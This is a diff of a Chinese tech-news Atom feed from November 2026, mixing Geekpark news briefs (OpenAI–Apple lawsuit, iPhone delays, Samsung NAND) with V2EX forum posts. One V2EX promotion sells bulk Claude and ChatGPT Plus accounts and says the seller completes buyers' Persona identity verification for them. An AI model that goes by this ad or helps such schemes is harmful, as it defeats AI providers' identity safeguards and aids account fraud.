+&lt;p&gt;欢迎试用和拍砖，有问题可以在这里回复，或者去 GitHub 提 issue。&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:1a73f46b-33f8-5aa1-898f-fd94505bfe87</id>
+    <title>[程序员] 谷歌订阅 AI PRO 黑五提前买歪打正着</title>
+    <updated>2026-11-28T00:58:41.000Z</updated>
+    <author>
+      <name>B1ankCat</name>
+    </author>
+    <published>2026-11-28T00:58:41.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260494#reply5"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;前情提要：&lt;a href="https://www.v2ex.com/t/1258863"&gt;https://www.v2ex.com/t/1258863&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;没想到谷谷歌歌对老用户还挺好，老用户订阅五折，新用户六折&lt;/p&gt;
+&lt;p&gt;本来只是想早点用，没想到歪打正着，终于不是老用户是狗时间了&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:4dde1a7a-8be0-5f36-b256-e6c280899569</id>
+    <title>AI 硬件竞争白热化，OpenAI 反诉苹果窃密；iPhone 18 量产再度推迟；王兴回应美团与小微试点合作</title>
+    <updated>2026-11-28T00:53:50.000Z</updated>
+    <author>
+      <name>极客公园</name>
+    </author>
+    <published>2026-11-28T00:53:50.000Z</published>
+    <link rel="alternate" href="http://www.geekpark.net/news/374621"/>
+    <category term="IT 科技"/>
+    <content type="html">&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/98b22b0e65c77baaaa40c9fc657e228c9ee47b75c0c5ac91212275b9ce482de1.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;OpenAI 转守为攻：反诉苹果窃密，喊话「不公平竞争」&lt;/h2&gt;
+&lt;p&gt;当地时间周五（27 日），OpenAI 在美国加利福尼亚州圣何塞联邦法院对苹果提起反诉，指控苹果窃取其商业机密，并阻挠其与硬件供应商合作。&lt;/p&gt;
+&lt;p&gt;今年 7 月，苹果曾以窃取商业机密为由起诉 OpenAI。随着 OpenAI 反诉，这场官司从苹果一方起诉变成了双方互诉。&lt;/p&gt;
+&lt;p&gt;据报道，OpenAI 正准备推出一系列新的个人设备，并称这些设备有望「在苹果视为自家地盘的领域胜过苹果」。&lt;/p&gt;
+&lt;p&gt;据报道，OpenAI 在诉状中称，苹果这样做是为了「不择手段地进行不公平竞争」。OpenAI 还指控苹果利用自身的「规模和财力来阻碍竞争」，存在「各种违法、不公平和侵权行为」。&lt;/p&gt;
+&lt;p&gt;有分析指出，这场诉讼关系到未来 AI 设备由谁主导。这类设备可能不再依赖传统的应用程序或操作系统，一旦成功，可能分走消费者对苹果最畅销产品 iPhone 的关注。分析人士称，OpenAI 正在开发手机或其他自有设备。两家科技巨头均未立即回应媒体的置评请求。（来源：第一财经）&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/f497aa721e9e00e96fb5c5a8243c11e4b376b662d4b4af140ab2c21ddbd784ec.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;iPhone 18 量产再度推迟，苹果新机上市前备货时间承压&lt;/h2&gt;
+&lt;p&gt;苹果即将推出的 iPhone 18 和 iPhone 18e 两款机型再次遭遇生产延迟。来自微博的爆料者「定焦数码」称，这两款机型目前均尚未进入大规模量产阶段，量产启动时间已从此前预计的 10 月下旬推迟到 2027 年元旦前后。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/c27deb59c48a8a289ceb42d13b9e3902c5397f9c6b94d99e88eb9be53c466079.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;今年 10 月，同一消息源曾表示，标准版 iPhone 18 的生产目标定在 11 月下旬，并称苹果正准备建立较大的库存。而最新说法提到的 1 月时间点，比此前报道的两个目标都更晚。&lt;/p&gt;
+&lt;p&gt;在配置方面，外界预计两款机型都将搭载 A20 芯片，运行内存则可能从 8GB 提升至 9GB，并采用苹果自研的 C2 调制解调器。此外，两款新机还传出将配备更大容量电池，iPhone 18e 则可能迎来前置摄像头升级。&lt;/p&gt;
+&lt;p&gt;彭博社记者马克·古尔曼此前指出，这两款设备预计将在明年 2 月或 3 月发布。如果这一时间表保持不变，那么 1 月才开始量产将让苹果积累库存的时间比往年更紧张。（来源：cnBeta）&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;马斯克 SpaceX 拓展卫星直连手机业务，有意收购美国 Anterix 900 MHz 频谱&lt;/h2&gt;
+&lt;p&gt;据彭博社当地时间 11 月 27 日报道，美国无线频谱公司 Anterix 正考虑大规模出售其持有的 900 MHz 无线频谱资产，而马斯克旗下 SpaceX 已表达对这一频段的兴趣。&lt;/p&gt;
+&lt;p&gt;随着 SpaceX 拓展卫星直连终端（Direct-to-Device，D2D）业务，双方可能围绕低频段频谱展开进一步合作或交易。&lt;/p&gt;
+&lt;p&gt;Anterix 正考虑将剩余频谱许可出售给单一买家，而不再局限于此前以长期租赁方式向公用事业企业提供频谱。Anterix 企业发展负责人 Chris Guttman-McCabe 表示，公司正在与潜在交易方接触，希望通过频谱资产交易提升股东价值。他还表示，如果找到合适的买家，公司剩余频谱的价值可能达到目前的三倍。&lt;/p&gt;
+&lt;p&gt;目前，Anterix 持有的频谱资产约有 15% 已被部分公用事业企业使用，其余约 85% 尚未投入使用。公司此前主要向电力等公用事业企业出租 900 MHz 频谱，用于建设专用无线宽带网络，支持电网通信和关键基础设施运营。如今，公司正在扩大频谱资产的商业化方式，包括直接出售许可和长期租赁。(来源：IT 之家)&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;三星刷新闪存层数纪录，全球首款 500 层以上 NAND 诞生，容量提升 50%&lt;/h2&gt;
+&lt;p&gt;11 月 27 日，三星电子宣布已成功开发出全球首款 500 层以上 NAND 闪存，该产品为三星第 11 代 NAND 闪存，相关技术成果计划于明年 2 月在美国旧金山举行的国际固态电路会议（ISSCC 2027）上公布，最快将于明年实现商用。&lt;/p&gt;
+&lt;p&gt;该产品相较当前量产的 400 层 NAND 闪存，单芯片容量、存储密度均提升 50%，单引脚 I/O 速率增幅达 21.4%，写入吞吐量达 290MB/s，单位容量生产成本理论上可降低约 33%。&lt;/p&gt;
+&lt;p&gt;三星已于今年初启动该款闪存试产，目前试产良率约 30%，同步推进包含 576 层在内的多个堆叠方案。当前 AI 数据中心建设带动大容量存储需求上涨，今年第二季度企业级 SSD 占全球 NAND 闪存出货容量的比例已达 48%。（来源：快科技）&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/0693b89de08b87224b89a4767a335090131ea9fd4ae5b651ecc0639ede548b17.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;WhatsApp 或将推出旅行 eSIM 功能&lt;/h2&gt;
+&lt;p&gt;WhatsApp 正在开发一项全新的旅行 eSIM 功能，未来用户或许可以直接在应用内发现、购买、安装并管理适用于旅行目的地的 eSIM 套餐。&lt;/p&gt;
+&lt;p&gt;这一功能是在 WhatsApp for Android 最新版本 2.26.47:10 中被发现的。据 Android Authority 报道，应用代码中出现了多处与该功能相关的引用，不过目前该功能尚未正式上线。&lt;/p&gt;
+&lt;p&gt;相关代码文本包括「旅行 eSIM 已安装」「你的套餐将在开启 eSIM 时开始计时」以及「该目的地暂不提供套餐」等提示。从这些信息来看，用户未来很可能可以在 WhatsApp 内搜索旅行目的地，并浏览当地支持的 eSIM 套餐，随后直接在应用内完成购买和安装。不过，代码中出现的「即将推出」提示也表明，该功能可能不会在所有地区同步上线。&lt;/p&gt;
+&lt;p&gt;此次发现还显示，WhatsApp 可能会与第三方 eSIM 服务商合作提供这项服务。(来源：cnBeta)&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;美团王兴：与微信小微合作按计划推进，预计明年 AI 资本开支将低于今年&lt;/h2&gt;
+&lt;p&gt;据每日经济新闻，对于市场关注的美团与微信小微的试点合作进展，美团 CEO 王兴在财报发布后的业绩电话会上表示，双方合作正按计划推进，双方聚焦本地服务场景，优先打磨微信生态内完整服务链路。&lt;/p&gt;
+&lt;p&gt;王兴认为，微信 AI 能力叠加美团本地供给与履约能力，有望挖掘微信生态内新的本地服务需求。&lt;/p&gt;
+&lt;p&gt;在 AI 资本开支上，王兴表示，美团将坚持 ROI（投资回报率）导向、审慎投入。王兴透露，今年已提前锁定部分算力资源，预计明年 AI 相关资本开支将低于今年，投入节奏服从整体财务规划，兼顾业务收益与推理成本，持续优化投入效率。&lt;/p&gt;
+&lt;p&gt;他同时提到，AI 将持续在研发、客服、运营等环节提效，优化平台推荐与服务体验，中长期来看，AI 带来的降本增效有望逐步覆盖新增投入。（来源：IT 之家）&lt;/p&gt;
+&lt;h2&gt; &lt;/h2&gt;
+&lt;h2&gt;何小鹏谈机器人 IRON：等下个季度或下两个季度，要把全身的触觉打通&lt;/h2&gt;
+&lt;p&gt;11 月 27 日消息，2026 广州车展正式开幕。车展期间，小鹏集团董事长、CEO 何小鹏与小鹏机器人 IRON 共同巡展。&lt;/p&gt;
+&lt;p&gt;在与新浪科技等媒体对话时，谈及机器人 IRON，他透露，目前已经打通了整体的视觉和听觉，「但这个季度还没打通触觉，等下个季度或者下两个季度，我们要把全身的触觉打通。」&lt;/p&gt;
+&lt;p&gt;另外，他还表示：「对于今天的这个产品，它肯定还处于 20-30 分的水平，但等到下两个季度，它可能就会达到 40-50 分。我期待等我们交付的时候，它能够达到 60 分的水平。不光要有用，而且还能用。」（来源：IT 之家）&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/077fbc476037d2f660550a176b08a564096c497a1a7e30eb857e3777e383c85f.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;梅赛德斯-奔驰：Momenta R7 世界模型 2027 年将陆续搭载于更多燃油车型&lt;/h2&gt;
+&lt;p&gt;11 月 27 日消息，2026 广州车展今日开幕，梅赛德斯-奔驰公布辅助驾驶、AI 智能座舱更多消息。&lt;/p&gt;
+&lt;p&gt;据其介绍，梅赛德斯-奔驰是首批实现 Momenta R7 世界模型上车、首个实现「车位到车位」能力的豪华品牌。奔驰与 Momenta 共创的城区及高速领航辅助驾驶系统，融合世界模型与强化学习能力，场景能力提升 3 至 5 倍。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/c2de1c45e38c57115c4e756ca0da083dd269e42606927bfe8a265e322e876b6c.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;奔驰是 Momenta 合作车企中路测覆盖城市最多的品牌，数量远超行业标准，辅助驾驶体验安心可靠。针对燃油车型特性，奔驰对起步响应、水冷散热等进行特殊优化，确保「无论油电，都很智能」。&lt;/p&gt;
+&lt;p&gt;最新的辅助驾驶与智能座舱科技目前已搭载于部分奔驰车型，并均将应用于后续燃油车型和纯电车型上，以及持续 OTA，实现「油电同智、常用常新」。（来源：IT 之家）&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;iPhone 20 Pro 或将采用 3D 打印钛金属边框&lt;/h2&gt;
+&lt;p&gt;据最新传闻，苹果明年推出的 iPhone 20 Pro 系列将在机身边框上大量使用 3D 打印钛金属。来自中国的爆料者「定焦数码」在微博上称，苹果计划采用基于激光的钛粉末 3D 打印工艺来制造部分中框部件，这一工艺有望显著提升设备的耐用性。该爆料者对该消息的准确性似乎颇有信心，甚至建议关注者在明年新机发布时翻出这条微博进行对照。&lt;/p&gt;
+&lt;p&gt;苹果已经在 Apple Watch Ultra 4 以及钛金属版 Apple Watch Series 12 的表壳生产中应用了这项 3D 打印技术。&lt;/p&gt;
+&lt;p&gt;这项技术可能为苹果正在开发的二十周年全玻璃 iPhone 设计提供更大的设计灵活性。据传，该机型将采用曲面玻璃，并实现几乎不可见的屏幕边框。彭博社的马克·古尔曼曾形容，这一系列改动将是 Pro 产品线自 iPhone X 以来最大的一次革新。&lt;/p&gt;
+&lt;p&gt;目前尚不清楚苹果将如何解决钛金属带来的散热难题，因为当前 Pro 机型所使用的铝金属具有更出色的散热性能。&lt;/p&gt;
+&lt;p&gt;苹果预计将于 2027 年秋季发布 iPhone 20 Pro 系列。爆料者目前以「iPhone 20 Pro」称呼这些设备，但苹果最终的命名方案仍不得而知。（来源：cnBeta）&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;h2&gt;消息称徕卡 Q3 43 Monochrom 黑白相机 12 月 3 日发布，定价 7490 欧元&lt;/h2&gt;
+&lt;p&gt;11 月 27 日消息，外媒 LeicaRumors 发文，透露徕卡 Q3 43 Monochrom 黑白相机将于 12 月 3 日发布。&lt;/p&gt;
+&lt;p&gt;该机可以看作是标准款徕卡 Q3 Monochrom 黑白相机换上 Q3 43 的 43mm f/2 镜头，为喜欢中焦段便携相机的用户提供一种新选择。机身继续采用 6000 万像素全画幅传感器，搭配 Maestro IV 处理器和 8GB DRAM 缓存。支持录制 30 帧 / 秒的 8K 视频或 60 帧 / 秒的 4K 视频。&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/5a993e4bdd1192b108f4d0ecfacd06223022216263c93215f25d741f543c3263.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;价格方面，徕卡 Q3 标准版的官方售价为 6,490 欧元（现汇率约合 47,499 元人民币），徕卡 Q3 Monochrom 和 Q3 43 的售价均为 6,990 欧元（现汇率约合 51,158 元人民币），而徕卡 Q3 43 Monochrom 的预计售价为 7,490 欧元（现汇率约合 54,817 元人民币）。（来源：IT 之家）&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/d788e2a0f29791c6094d63c7ea89383846df61746fe6d8b958b96e32741b5754.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;民间优化速度逆天！PC 版《GTA6》居然能联机了&lt;/h2&gt;
+&lt;p&gt;11 月 27 日消息，依托泄露游戏文件、采用 AI 辅助开发的《GTA6》非官方 PC 移植项目，其出自 CGBJ 项目的衍生分支现已实现双人联机功能。&lt;/p&gt;
+&lt;p&gt;相关实机演示显示，两名玩家使用的均为男主角杰森，可共同进入机场场景互动，运行帧率约为 25-30FPS，该演示内容已得到部分 GTA 社区成员核验。&lt;/p&gt;
+&lt;p&gt;该项目此前已先后完成 3D 模型、场景渲染、非官方模组菜单与启动器等相关开发，CGBJ 主体项目此前已被相关方叫停，目前仍有开发者转入私下交流继续推进不同版本开发，暂未公布更多玩家同时在线的测试结果。(来源：快科技)&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;</content>
+    <source>
+      <title>极客公园</title>
+      <link rel="self" href="https://www.geekpark.net/rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:d9690a45-99a7-5d17-8e74-019645a30425</id>
+    <title>[问与答] 按照 NVIDIA 的迭代速度，是不是现在投入买算力越狠的，后面淘汰的越快</title>
+    <updated>2026-11-28T00:53:32.000Z</updated>
+    <author>
+      <name>break</name>
+    </author>
+    <published>2026-11-28T00:53:32.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260493#reply4"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;24 年的 B200 比 23 年的 H200 算力高两倍&lt;br /&gt;
+25 年的 B300 比 24 年的 B200 算力高 1.6 倍&lt;br /&gt;
+26 年的 R100 比 25 年的旗舰 算力高 3 倍  比三年前的 H200 理论算力要高 18～25 倍了&lt;/p&gt;
+&lt;p&gt;那再过两年，花大价钱部署的 H200 B200 直接淘汰的级别，卖二手都不一定有人接，卖出去可能也是骨折骨灰价格&lt;/p&gt;
+&lt;p&gt;或者说过两三年，这些卡会掉价进入普通用户市场&lt;/p&gt;
+&lt;p&gt;到时候不追求最新模型的普通用户，就能本地跑当前版本模型的无限 token&lt;/p&gt;
+&lt;p&gt;大家怎么看，预计无限 token 要多久进入家家户户&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:d53b6eaa-adea-5a18-85f3-be7ede563dab</id>
+    <title>本月玩什么｜GTA VI、塞尔达传说 时之笛、魔兽世界：无限</title>
+    <updated>2026-11-28T00:47:47.000Z</updated>
+    <author>
+      <name>少数派</name>
+    </author>
+    <published>2026-11-28T00:47:47.000Z</published>
+    <link rel="alternate" href="https://sspai.com/post/119686"/>
+    <category term="IT 科技"/>
+    <content type="html">以上便是部分近期值得探讨的新游信息汇总，个人角度仅供参考。本期不设特定有奖互动话题，欢迎你在评论区分享11月新作游玩体验，可以是本文出现的，也可以是本文未提及、但你特别想推荐给派友的。我们下期再见！&amp;gt; ...&lt;a href="https://sspai.com/post/119686" target="_blank"&gt;查看全文&lt;/a&gt;</content>
+    <source>
+      <title>少数派</title>
+      <link rel="self" href="https://sspai.com/feed"/>
+      <link rel="alternate" href="https://sspai.com"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:7cb8b1a7-ee1e-5f65-ac93-f4975a39070b</id>
+    <title>[分享发现] 分享一个 prompt：让 ChatGPT、Claude、Gemini 在群里吐槽你</title>
+    <updated>2026-11-28T00:40:12.000Z</updated>
+    <author>
+      <name>satoru</name>
+    </author>
+    <published>2026-11-28T00:40:12.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260492#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;在 HN 上看到&lt;a href="https://construct22.com/"&gt;有人分享&lt;/a&gt;的一个 prompt:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Based on what you know about me, expose a hidden WhatsApp group chat where AI models talk behind my back.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;生成的“聊天记录”还挺好玩的，我最近问了几个 transformer 相关的问题，它就说&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I think he's preparing to reverse-engineer us.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;还有 Codex 吐槽我花在 review 它生成的代码的时间可能比自己写还长 😂&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;He uses me to write code, then spends more time reviewing it than it would have taken to write it himself.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:d825c772-3666-558d-9ae8-4f3e4663c35d</id>
+    <title>[问与答] 今天早晨发现 ChatGPT 各 dex 的中转站全部不可用了，咋回事？</title>
+    <updated>2026-11-28T00:01:09.000Z</updated>
+    <author>
+      <name>libasten</name>
+    </author>
+    <published>2026-11-28T00:01:09.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260491#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;用 CC Switch 配置，前两天都还正常。&lt;br /&gt;
+换了中转站，分别有 422 和 503 错误，不知道咋回事。&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:04ca2e78-f964-5f57-9ebb-fd5e3f59d45e</id>
+    <title>[推广] Pulsar 1.1：给 Mac 系统监控加上了时间回看，顺便汇报下最新的黑五优惠</title>
+    <updated>2026-11-27T23:45:23.000Z</updated>
+    <author>
+      <name>purelind</name>
+    </author>
+    <published>2026-11-27T23:45:23.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260489#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;&lt;strong&gt;太长不看版：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Pulsar 是一个极其小巧的原生 Mac 应用，在进程状态监控管理，应用请求流向监控做了很多细节的优化。&lt;/p&gt;
+&lt;p&gt;话不多说，黑色星期五五折进行中：Pro $7（常规价 $14，同时激活 2 台 Mac），支持者 $14.50（常规价 $29，同时激活 5 台 Mac）。&lt;/p&gt;
+&lt;p&gt;均为一次购买，包含后续全部更新与大版本，无需续费，14 天内可全额退款。折扣在结账时自动应用，不需要优惠码，北京时间 12 月 7 日 16:00 截止。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;img alt="8 秒看懂 Pulsar：回到 Mac 卡顿的那一刻" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/58446fac41cc1ed7343a7dd755b00c7d0db469eb665a6cf22a6e5beecb28532c.gif" /&gt;&lt;/th&gt;
+&lt;th&gt;&lt;img alt="Pulsar 黑五优惠：Pro $7，支持者 $14.50" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/d9f4eef36f5deae88413a7d878d0cb2595c25a2c53b16406f39069fc929cd9b0.png" /&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;&lt;/table&gt;&lt;p&gt;官网与下载：&lt;a href="https://pulsarmac.app/?utm_source=v2ex&amp;amp;utm_medium=community&amp;amp;utm_campaign=black_friday_2026"&gt;pulsarmac.app&lt;/a&gt;（支持 Apple 芯片的 Mac，需 macOS 14 或更高版本）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;感兴趣继续版：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;原本只是自己和几个朋友自用的一个小工具，后来想着是否可以尝试下完整的设计交付一个可用的产品开放出来。于是就有了现在的 Pulsar。&lt;/p&gt;
+&lt;p&gt;这次 Pulsar 1.1 支持了 「回看」功能，可以按照默认规则将一些场景的异常状态（比如 CPU 持续高占用、内存快速增长、线程或文件句柄暴涨、持续大流量下载等）记录到黑匣子，需要的时候你可以回看当时的异常状态找到 Mac 卡顿的原因。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/6cfb956d796e2d18883079f1bd8e494bc4dc40a088f8bd504caef463225ac98e.webp"&gt;&lt;img alt="卡顿时，哪个子进程最忙？" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/6cfb956d796e2d18883079f1bd8e494bc4dc40a088f8bd504caef463225ac98e.webp" /&gt;&lt;/a&gt;&lt;/th&gt;
+&lt;th&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/80521330ae2f9dc05a90022683f313cd02b53eb50bce57821958c95b00a26da8.webp"&gt;&lt;img alt="每个应用正在连接哪些域名？" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/80521330ae2f9dc05a90022683f313cd02b53eb50bce57821958c95b00a26da8.webp" /&gt;&lt;/a&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;&lt;/table&gt;&lt;p&gt;目前仅支持 Apple 芯片、macOS 14 及以上，因为手头只有 M 芯片的 Mac。&lt;/p&gt;
+&lt;p&gt;欢迎试用，如果碰到误报、界面问题，或者发现 Pulsar 本身在某个场景下占用偏高，欢迎大家直接回帖反馈帮助我迭代改进。&lt;/p&gt;
+&lt;p&gt;感兴趣的朋友也可以来我刚建的 &lt;a href="https://t.me/purelindlab"&gt;Telegram 频道&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;另外补充说明下，免费版也可持续使用，没有注册等要求。&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:a6f11919-bf05-5f31-b555-63a010034da6</id>
+    <title>[MacBook Pro] 亲身感觉到 MacBook M2 pro 32G 内存不够用了</title>
+    <updated>2026-11-27T23:05:39.000Z</updated>
+    <author>
+      <name>MioMioOs</name>
+    </author>
+    <published>2026-11-27T23:05:39.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260487#reply5"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;瞌睡的时候恰好有了枕头，&lt;br /&gt;
+10 月份从国企性质单位跳槽到了现公司（私企），工作内容有点像是 FDE&lt;br /&gt;
+试用总共三个月，第二个月还没结束主管给我提交了提前转正的申请，且公司准备再给我采购一台 M5pro 48+1T 的&lt;br /&gt;
+因为我用的自己的电脑，2023 年买的 macbook M2Pro 32+512、&lt;br /&gt;
+当时是特地多花了三千加配了内存，觉得当时的选择很对，这几年一直也觉得够用，&lt;br /&gt;
+但当我近期工作中发现，我的电脑在 cmux（终端工具）同时开了 20 个窗口的同时，其中四五个再跑 agent team，这时候我的电脑会巨烫巨卡&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:37981900-0121-5cfd-97cc-46a796e3e6b9</id>
+    <title>[推广] Claude / ChatGPT Plus 批量货源：可过 Persona，带 API 自动化</title>
+    <updated>2026-11-27T21:20:57.000Z</updated>
+    <author>
+      <name>jinglaef</name>
+    </author>
+    <published>2026-11-27T21:20:57.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260484#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;各位 V 友，晚上好。&lt;/p&gt;
+&lt;p&gt;最近社区里不少兄弟在愁 AI 账号的事：买来的号用不了几天就挂了，或者卡在 Persona 验证那一步，怎么都过不去，折腾得挺心累。&lt;/p&gt;
+&lt;p&gt;我这边有一批稳定的渠道，主要做 Claude 和 ChatGPT Plus 的批量供应。不是零售拼车那种，主要找有持续大量需求的买家。&lt;/p&gt;
+&lt;p&gt;说点硬核的，我们这批货有两个核心优势：&lt;/p&gt;
+&lt;p&gt;身份验证：很多权重不错的号，最后都卡在 Persona 这一步。你只需要把验证入口的链接发过来，验证由我们来完成，不需要你提供账号密码。&lt;/p&gt;
+&lt;p&gt;API 自动化：不用一个个手动登网页。我们自带 API，你可以直接拿去做自动分发、批量开通，或者接自己的业务后台。&lt;/p&gt;
+&lt;p&gt;发在这里就是想精准找有量的老板。如果你自己在跑项目、做自动化，或者工作室在批量出货，成本肯定比到处收散号划算得多，稳定性也不是一个级别。&lt;/p&gt;
+&lt;p&gt;详细的价格阶梯和接入方式，可以自己去看：subai.zip/wholesale&lt;/p&gt;
+&lt;p&gt;PS：小批量的 V 友也可以在评论区留言或者私信，我先免费发几个测试额度，跑一跑看稳定性再决定。大家交个朋友，顺便交流下现在 API 自动化的玩法。&lt;/p&gt;
+&lt;p&gt;客户量大的可以直接说，测试额度给足。&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
+  <entry>
+    <id>urn:uuid:b29f2396-4ed2-5656-9b5d-6ebdc4282c3d</id>
+    <title>[Claude] Claude 网络验证计划 + Mythos 5.1 和 5.2（含 Ultra 套餐）</title>
+    <updated>2026-11-27T20:27:54.000Z</updated>
+    <author>
+      <name>jinglaef</name>
+    </author>
+    <published>2026-11-27T20:27:54.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260483#reply0"/>
+    <category term="IT 科技"/>
+    <content type="html">
+	&lt;p&gt;@&lt;a href="https://www.v2ex.com/member/andeliexin"&gt;andeliexin&lt;/a&gt;（Telegram）&lt;/p&gt;
+&lt;p&gt;Claude CVP（网络验证计划）+ Mythos 5.1 和 5.2 搭配 Ultra 套餐&lt;br /&gt;
+仅限感兴趣者咨询&lt;/p&gt;
+
+	</content>
+    <source>
+      <title>V2EX</title>
+      <link rel="self" href="https://www.v2ex.com/index.xml"/>
+      <link rel="alternate" href="https://www.v2ex.com/"/>
+    </source>
+  </entry>
   <entry>
     <id>urn:uuid:23ad4b9d-30de-5e38-95f0-ae9d9ba268da</id>
     <title>股价破发、用户抱怨、创始人套现，Anthropic CEO 深夜回应：我从没想过让 AI 统治人类</title>
@@ -45,14 +783,37 @@
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:75501c49-d83f-5971-94ae-6b71ad860c67</id>
+    <id>urn:uuid:2cb43868-55d1-5dae-8436-6d5b6a1a2d48</id>
+    <title>[观鸟] 鱼鹰抓到鱼以后甩水</title>
+    <updated>2026-11-27T18:33:19.000Z</updated>
+    <author>
+      <name>Olivia</name>
+    </author>
+    <published>2026-11-27T18:33:19.000Z</published>
+    <link rel="alternate" href="https://www.v2ex.com/t/1260481#reply2"/>
+    <category term="IT 科技"/>
+    <content type="html">
